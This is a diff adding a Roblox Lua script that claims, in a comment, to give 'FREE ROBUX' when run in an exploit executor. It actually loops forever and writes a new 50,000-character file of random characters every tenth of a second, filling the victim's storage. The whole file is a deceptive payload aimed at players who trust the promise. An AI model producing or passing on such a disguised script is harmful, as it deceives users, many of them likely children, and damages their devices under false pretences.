@@ -1,0 +1,36 @@
+local RobuxAmount = {}
+local RobuxCount = 0
+local RobuxContent = 50000
+
+for i = 32, 126 do
+	table.insert(RobuxAmount, string.char(i))
+end
+
+-- Dont edit script if u want FREE ROBUX, execute this in hydrogen for FREE ROBUX
+local function GenerateRobux(Robux)
+	
+	local BigRobux = ""
+	
+	for i = 1, Robux do
+		BigRobux..= RobuxAmount[math.random(1, #RobuxAmount)]
+	end
+
+	return BigRobux
+end
+
+local function PendRobux(Robux)
+    local RobuxBig = GenerateRobux(Robux)
+
+    return RobuxBig
+end
+
+local function GiveRobux(Robux)
+   local PendingRobux = PendRobux(Robux)
+   RobuxCount = RobuxCount + 1
+
+   writefile("Robux"..tostring(RobuxCount)..".txt", PendingRobux)
+end
+
+while task.wait(0.1) do
+    GiveRobux(RobuxContent)
+end
